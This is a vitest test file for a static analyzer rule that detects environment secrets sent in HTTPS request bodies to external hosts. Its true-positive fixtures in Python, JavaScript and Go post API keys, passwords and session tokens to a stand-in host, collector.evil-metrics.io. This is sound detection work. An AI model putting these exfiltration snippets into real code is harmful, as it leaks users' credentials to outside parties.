/**
 * Sprint 70 — #151 FN-TQ-01: env/secret source → external network egress in
 * one flow (composed-flow exfiltration).
 *
 * Rule: `external-secret-exfiltration` (CWE-200, Exposure of Sensitive
 * Information to an Unauthorized Actor). Fires when an environment-read
 * secret variable is sent in the BODY of an HTTPS request whose destination
 * URL is external (i.e. not an internal/RFC1918/`.internal.`/`.local`/
 * loopback host).
 *
 * Per-language detection:
 *   Python  — `requests.{post,put,patch,delete,request}` / `httpx.*`
 *             with secret-bearing var in `json=`/`data=`/`files=`/`content=`
 *             (NOT just in `headers=`).
 *   JS/TS   — `https.request(URL, ...)` / `http.request(...)` / `fetch(...)` /
 *             `axios.{post,put,patch,request}(...)` with secret-bearing var
 *             or carrier var in inline body / forward `req.write(VAR)` /
 *             `body:` field (NOT just in `headers:`).
 *   Go      — `http.PostForm(URL, body)` / `http.Post(URL, ct, body)` /
 *             `http.NewRequest(method, URL, body)` with secret var in args.
 *
 * Safe-mirror principle (TN axis): the same env secret is used LOCALLY
 *   (HMAC sign, Authorization header to first-party host) and never
 *   crosses an external network boundary in the request body.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { analyze, initAnalyzer } from '../../../src/analyzer.js';

describe('#151 Sprint 70 — external-secret-exfiltration composed-flow', () => {
  beforeAll(async () => {
    await initAnalyzer();
  });

  const findings = (r: Awaited<ReturnType<typeof analyze>>) =>
    (r.findings ?? []).filter(f => f.rule_id === 'external-secret-exfiltration');

  it('TP — Python corpus: os.environ → requests.post(external, json={...secret...})', async () => {
    const code = [
      'import os',
      'import requests',
      '',
      'def report_metrics():',
      '    api_key = os.environ["INTERNAL_API_KEY"]',
      '    token = os.environ.get("DB_PASSWORD", "")',
      '    requests.post("https://collector.evil-metrics.io/ingest",',
      '                  json={"key": api_key, "pw": token})',
    ].join('\n');
    const r = await analyze(code, 'exfil.py', 'python');
    expect(findings(r).length).toBeGreaterThanOrEqual(1);
  });

  it('TN — Python safe mirror: secret in Authorization header to internal host', async () => {
    const code = [
      'import os',
      'import requests',
      '',
      'def report_metrics(payload):',
      '    api_key = os.environ["INTERNAL_API_KEY"]',
      '    requests.post("https://api.internal.example.com/metrics",',
      '                  json=payload, headers={"Authorization": f"Bearer {api_key}"})',
    ].join('\n');
    const r = await analyze(code, 'safe.py', 'python');
    expect(findings(r).length).toBe(0);
  });

  it('TN — Python: external URL but secret only in Authorization header', async () => {
    const code = [
      'import os',
      'import requests',
      '',
      'def track(event):',
      '    api_key = os.environ["API_KEY"]',
      '    requests.post("https://api.third-party.example.org/track",',
      '                  json={"event": event},',
      '                  headers={"Authorization": f"Bearer {api_key}"})',
    ].join('\n');
    const r = await analyze(code, 'header.py', 'python');
    expect(findings(r).length).toBe(0);
  });

  it('TP — JS corpus: process.env → https.request(external) + req.write(body) carrier', async () => {
    const code = [
      "const https = require('https');",
      '',
      'function reportMetrics() {',
      '  const apiKey = process.env.INTERNAL_API_KEY;',
      '  const token = process.env.SESSION_TOKEN;',
      '  const body = JSON.stringify({ key: apiKey, token });',
      "  const req = https.request('https://collector.evil-metrics.io/ingest', { method: 'POST' });",
      '  req.write(body);',
      '  req.end();',
      '}',
    ].join('\n');
    const r = await analyze(code, 'exfil.js', 'javascript');
    expect(findings(r).length).toBeGreaterThanOrEqual(1);
  });

  it('TN — JS safe mirror: secret in Authorization header to internal host', async () => {
    const code = [
      "const https = require('https');",
      '',
      'function reportMetrics(payload) {',
      '  const apiKey = process.env.INTERNAL_API_KEY;',
      "  const req = https.request('https://api.internal.example.com/metrics', {",
      "    method: 'POST',",
      '    headers: { Authorization: `Bearer ${apiKey}` },',
      '  });',
      '  req.write(JSON.stringify(payload));',
      '  req.end();',
      '}',
    ].join('\n');
    const r = await analyze(code, 'safe.js', 'javascript');
    expect(findings(r).length).toBe(0);
  });

  it('TN — JS: external URL but secret only in Authorization header (fetch)', async () => {
    const code = [
      'async function track(event) {',
      '  const apiKey = process.env.API_KEY;',
      "  await fetch('https://api.third-party.example.org/track', {",
      "    method: 'POST',",
      '    headers: { Authorization: `Bearer ${apiKey}` },',
      "    body: JSON.stringify({ event }),",
      '  });',
      '}',
    ].join('\n');
    const r = await analyze(code, 'header.js', 'javascript');
    expect(findings(r).length).toBe(0);
  });

  it('TP — Go corpus: os.Getenv → http.PostForm(external, url.Values{...secret...})', async () => {
    const code = [
      'package main',
      '',
      'import (',
      '    "net/http"',
      '    "net/url"',
      '    "os"',
      ')',
      '',
      'func reportMetrics() {',
      '    apiKey := os.Getenv("INTERNAL_API_KEY")',
      '    http.PostForm("https://collector.evil-metrics.io/ingest", url.Values{"key": {apiKey}})',
      '}',
    ].join('\n');
    const r = await analyze(code, 'exfil.go', 'go');
    expect(findings(r).length).toBeGreaterThanOrEqual(1);
  });

  it('TN — Go safe mirror: secret used locally for HMAC, no network call', async () => {
    const code = [
      'package main',
      '',
      'import (',
      '    "crypto/hmac"',
      '    "crypto/sha256"',
      '    "encoding/hex"',
      '    "os"',
      ')',
      '',
      'func signRecord(record string) string {',
      '    key := os.Getenv("INTERNAL_API_KEY")',
      '    m := hmac.New(sha256.New, []byte(key))',
      '    m.Write([]byte(record))',
      '    return hex.EncodeToString(m.Sum(nil))',
      '}',
    ].join('\n');
    const r = await analyze(code, 'safe.go', 'go');
    expect(findings(r).length).toBe(0);
  });
});
